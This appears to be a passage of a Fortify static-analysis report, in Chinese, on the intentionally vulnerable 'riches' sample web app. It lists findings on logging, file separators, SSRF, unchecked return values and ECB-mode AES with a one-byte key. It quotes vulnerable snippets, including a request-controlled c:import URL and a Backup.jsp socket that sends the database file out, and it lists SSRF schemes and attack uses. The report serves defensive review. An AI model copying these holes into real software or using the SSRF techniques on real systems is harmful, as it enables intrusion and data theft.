                                <Value>应该将类 ConnectionFactory 的日志记录器声明为固定且最终的记录器。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>在某个特定类中的所有实例中，共享一个单一的记录器对象，并在程序的执行过程中使用同一个记录器，这是一个很好的编程习惯。

例 1：以下指令错误地声明了一个非固定日志记录器。


private final Logger logger =
            Logger.getLogger(MyClass.class);
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>声明记录器是固定且最终的。

示例 2：Example 1 中的代码可通过以下方式重写：


private final static Logger logger =
            Logger.getLogger(MyClass.class);
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="4E2BE5B5FFD1CD56077C129251D093B8" ruleID="BADC0909-9860-4304-88B8-D539884A5CD0">
                            <Category>Poor Logging Practice: Logger Not Declared Static Final</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>应该将类 ConnectionFactory 的日志记录器声明为固定且最终的记录器。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>15</LineStart>
                                <Snippet>public class ConnectionFactory
{
    private static Logger log = Logger.getLogger(ConnectionFactory.class.getName());

	private static ConnectionFactory instance = null;</Snippet>
                                <TargetFunction>Field: log()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Portability Flaw: File Separator</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>调用第 5 行的 File() 可能会导致可移植性问题，因为它使用硬编码文件分隔符。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>不同的操作系统使用不同的字符作为文件分隔符。例如，Microsoft Windows 系统使用“\”，而 UNIX 系统则使用“/”。应用程序需要在不同的平台上运行时，使用硬编码文件分隔符会导致应用程序逻辑执行错误，并有可能导致 denial of service。



例 1：以下代码使用硬编码文件分隔符来打开文件：


...
File file = new File(directoryName + "\\" + fileName);
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>为编写可移植代码，不应使用硬编码文件分隔符，而应使用语言库提供的独立于平台的 API。

示例 2：以下代码实现的功能与Example 1 相同，但会使用独立于平台的 API 来指定文件分隔符：


...
File file = new File(directoryName + File.separator + fileName);
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B92EC892344F810CCC539BCF142B8CCC" ruleID="2C293937-873C-4DFD-9F58-1B2596CE872B">
                            <Category>Portability Flaw: File Separator</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>调用第 5 行的 File() 可能会导致可移植性问题，因为它使用硬编码文件分隔符。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>Backup.jsp</FileName>
                                <FilePath>pages/Backup.jsp</FilePath>
                                <LineStart>5</LineStart>
                                <Snippet>
  java.net.Socket skt = srvr.accept();
  java.io.File pf = new java.io.File("webapps\\riches\\WEB-INF\\database\\riches.script");
  if (pf.exists()) {
    java.io.PrintWriter p_out = new java.io.PrintWriter(skt.getOutputStream(), true);</Snippet>
                                <TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>Backup.jsp</FileName>
                                <FilePath>pages/Backup.jsp</FilePath>
                                <LineStart>5</LineStart>
                                <Snippet>
  java.net.Socket skt = srvr.accept();
  java.io.File pf = new java.io.File("webapps\\riches\\WEB-INF\\database\\riches.script");
  if (pf.exists()) {
    java.io.PrintWriter p_out = new java.io.PrintWriter(skt.getOutputStream(), true);</Snippet>
                                <TargetFunction>Read()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Server-Side Request Forgery</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>第 6 行的函数 _jspService() 将使用资源 URI 的用户控制数据启动与第三方系统的网络连接。攻击者可以利用此漏洞代表应用程序服务器发送一个请求，因为此请求将自应用程序服务器内部 IP 地址发出。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>当攻击者可以影响应用程序服务器建立的网络连接时，将会发生 Server-Side Request Forgery。网络连接源自于应用程序服务器内部 IP，因此攻击者将可以使用此连接来避开网络控制，并扫描或攻击没有以其他方式暴露的内部资源。



示例：在下列中，攻击者将能够控制服务器连接至的 URL。


String url = request.getParameter("url");
CloseableHttpClient httpclient = HttpClients.createDefault();
HttpGet httpGet = new HttpGet(url);
CloseableHttpResponse response1 = httpclient.execute(httpGet);


攻击者劫持网络连接的能力取决于他可以控制的 URI 的特定部分以及用于建立连接的库。例如，控制 URI 方案将使攻击者可以使用不同于 http 或 https 的协议，类似于如下：

- up://
- ldap://
- jar://
- gopher://
- mailto://
- ssh2://
- telnet://
- expect://

攻击者将可以利用劫持的此网络连接执行下列攻击：

- 对内联网资源进行端口扫描。
- 避开防火墙。
- 攻击运行于应用程序服务器或内联网上易受攻击的程序。
- 使用 Injection 攻击或 CSRF 攻击内部/外部 Web 应用程序。
- 使用 file:// 方案访问本地文件。
- 在 Windows 系统上，file:// 方案和 UNC 路径可以允许攻击者扫描和访问内部共享。
- 执行 DNS 缓存中毒攻击。
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>请勿基于用户控制的数据建立网络连接，并要确保请求发送给预期的目的地。如果需要提供用户数据来构建目的地 URI，请采用间接方法：例如创建一份合法资源名的列表，并且规定用户只能选择其中的文件名。通过这种方法，用户就不能直接由自己来指定资源的名称了。

但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大、难以跟踪。因此，程序员通常在这种情况下采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。

此外，如果需要，还要确保用户输入仅用于在目标系统上指定资源，但 URI 方案、主机和端口由应用程序控制。这样就可以大大减小攻击者能够造成的损害。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="EB8C14B59DC1E799F4243AA06DE1CB52" ruleID="CBDB4B3B-EB0F-4147-905B-8B80B42EA3900">
                            <Category>Server-Side Request Forgery</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>第 6 行的函数 _jspService() 将使用资源 URI 的用户控制数据启动与第三方系统的网络连接。攻击者可以利用此漏洞代表应用程序服务器发送一个请求，因为此请求将自应用程序服务器内部 IP 地址发出。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>Security.jsp</FileName>
                                <FilePath>pages/content/Security.jsp</FilePath>
                                <LineStart>6</LineStart>
                                <Snippet>&lt;td valign="top" align="center"&gt;

    &lt;c:import url="&lt;%=request.getParameter(\"privacy_statement\")%&gt;"/&gt;

    &lt;br/&gt;</Snippet>
                                <TargetFunction>http://java.sun.com/jsp/jstl/core/import/_jspService()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>Security.jsp</FileName>
                                <FilePath>pages/content/Security.jsp</FilePath>
                                <LineStart>6</LineStart>
                                <Snippet>&lt;td valign="top" align="center"&gt;

    &lt;c:import url="&lt;%=request.getParameter(\"privacy_statement\")%&gt;"/&gt;

    &lt;br/&gt;</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Unchecked Return Value</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>UploadProfilePicture.java 中的 execute() 方法忽略了第 48 行的 exists() 返回的值，这可能会导致程序无法发现意外状况和情况。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Java 程序员常常会误解包含在许多 java.io 类中的 read() 及相关方法。在 Java 结果中，将大部分错误和异常事件都作为异常抛出。（这是 Java 相对于 C 语言等编程语言的优势：各种异常更加便于程序员考虑是哪里出现了问题。）但是，如果只有少量的数据可用，stream 和 reader 类并不认为这是异常的情况。这些类只是将这些少量的数据添加到返回值缓冲区，并且将返回值设置为读取的字节或字符数。所以，并不能保证返回的数据量一定等于请求的数据量。

这样，程序员就需要检查 read() 和其他 IO 方法的返回值，以确保接收到期望的数据量。



示例：下列代码会在一组用户中进行循环，读取每个用户的私人数据文件。程序员假设这些文件总是正好 1000 字节，从而忽略了检查 read() 的返回值。如果攻击者能够创建一个较小的文件，程序就会重复利用前一个用户的剩余数据，并对这些数据进行处理，就像这些数据属于攻击者一样。


FileInputStream fis;
byte[] byteArray = new byte[1024];
for (Iterator i=users.iterator(); i.hasNext();) {
    String userName = (String) i.next();
    String pFileName = PFILE_ROOT + "/" + userName;
    FileInputStream fis = new FileInputStream(pFileName);
    fis.read(byteArray); // the file is always 1k bytes
    fis.close();
    processPFile(userName, byteArray);
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>
  FileInputStream fis;
  byte[] byteArray = new byte[1024];
  for (Iterator i=users.iterator(); i.hasNext();) {
    String userName = (String) i.next();
    String pFileName = PFILE_ROOT + "/" + userName;
    fis = new FileInputStream(pFileName);
    int bRead = 0;
    while (bRead &lt; 1024) {
        int rd = fis.read(byteArray, bRead, 1024 - bRead);
        if (rd == -1) {
          throw new IOException("file is unusually small");
        }
        bRead += rd;
    }
    // could add check to see if file is too large here
    fis.close();
    processPFile(userName, byteArray);
  }


注：因为该问题的修复相当地复杂，您可能试图使用一个更简单的方法，例如在开始阅读前检查文件的大小。这种方法将导致应用程序容易受到文件系统 race condition 的攻击，凭借这个攻击者可以在文件大小检查和从文件调用读取数据之间使用恶意文件替换结构良好的文件。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 为了对此类问题进行辩解，某些程序员这样解释道：“这是绝对不可能会发生的，因为...”，对此我们必须加以提防。如今，程序员能够利用自己的开发环境来拓展对系统运行方式的直观认识。如果软件最终运行在不同种类或版本的操作系统上、采用不同的硬件配置或运行时环境，那么原有的直观认识可能就不再适用了。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="D24F479B0F04DC0131BF9897DF5E497D" ruleID="ED57A0C1-5039-43E7-B753-28128F786E8B">
                            <Category>Unchecked Return Value</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>UploadProfilePicture.java 中的 execute() 方法忽略了第 48 行的 exists() 返回的值，这可能会导致程序无法发现意外状况和情况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>UploadProfilePicture.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/UploadProfilePicture.java</FilePath>
                                <LineStart>48</LineStart>
                                <Snippet>        String directory = home + dir_separator+ "webapps"+dir_separator+ "riches"+dir_separator+"profilepictures";
        File dir=new File(directory);
        dir.exists();
        new_filename =directory+dir_separator+filename;
</Snippet>
                                <TargetFunction>exists()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Weak Encryption: Insecure Mode of Operation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>PerformTransfer.java 中的函数 execute() 在第 46 行上将密码加密算法用于不安全的操作模式。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>块密码操作模式是一种算法，用来描述如何重复地应用密码的单块操作，以安全地转换大于块的数据量。其中一些操作模式包括电子代码本 (ECB)、密码块链 (CBC) 和密码反馈 (CFB)。

ECB 模式本质上较弱，因为它会对相同的明文块生成一样的密文。CBC 模式由于没有这个缺陷，使之成为一个更好的选择。

示例 1：以下代码将 AES 密码用于 ECB 模式：


...
SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS7Padding", "BC");
cipher.init(Cipher.ENCRYPT_MODE, key);
...
&#xD;

密码转换模式：

Cipher.getInstance 的第一个参数是 transformation 字符串参数，其形式为“algorithm/mode/padding”或“algorithm”。如果没有指定此模式，则选定模式是提供商特定的默认模式，这可能是适用于 Java 和 Android 的电子代码本 (ECB) 模式。

ECB 模式本质上是一种较弱的加密模式，因为相同的明文块加密成相同的密码块。CBC（密码块链）模式是超级模式，因此它没有此弱点。

例：利用弱 ECB 转换模式获取密码实例：


Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");


例：利用默认转换模式（可能是弱 ECB 模式）获取密码实例：


Cipher c = Cipher.getInstance("AES");


此结果来自《Android 应用中加密滥用实证研究》(An Empirical Study of Cryptographic Misuse in Android Applications) 中找到的研究成果。http://www.cs.ucsb.edu/~chris/research/doc/ccs13_cryptolint.pdf
  </Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>加密大于块的数据时，避免使用 ECB 操作模式。CBC 模式更好，因为它不会对相同的明文块生成相同的密文块。然而，CBC 模式效率较低，并且在和 SSL 一起使用时会造成严重风险。[1] 请改用 CCM (Counter with CBC-MAC) 模式，或者如果更注重性能，则使用 GCM（Galois/Counter 模式）模式（如可用）。

示例 2：以下代码将 AES 密码用于 CBC 模式：


...
SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding", "BC");
cipher.init(Cipher.ENCRYPT_MODE, key);
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="80C024779717C2610D20D4CEDC83F814" ruleID="C4ECC6B6-1A5E-41D8-97DE-807334D22D07">
                            <Category>Weak Encryption: Insecure Mode of Operation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>PerformTransfer.java 中的函数 execute() 在第 46 行上将密码加密算法用于不安全的操作模式。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>PerformTransfer.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/PerformTransfer.java</FilePath>
                                <LineStart>46</LineStart>
                                <Snippet>		    byte[] theKey={'a'};
		    SecretKeySpec skeySpec = new SecretKeySpec(theKey, "AES");
		    Cipher cipher = Cipher.getInstance("AES");
		    cipher.init(Cipher.ENCRYPT_MODE, skeySpec); // Exception thrown:java.security.InvalidKeyException: Invalid AES key length: 1 bytes
	    }</Snippet>
                                <TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
</ReportDefinition>
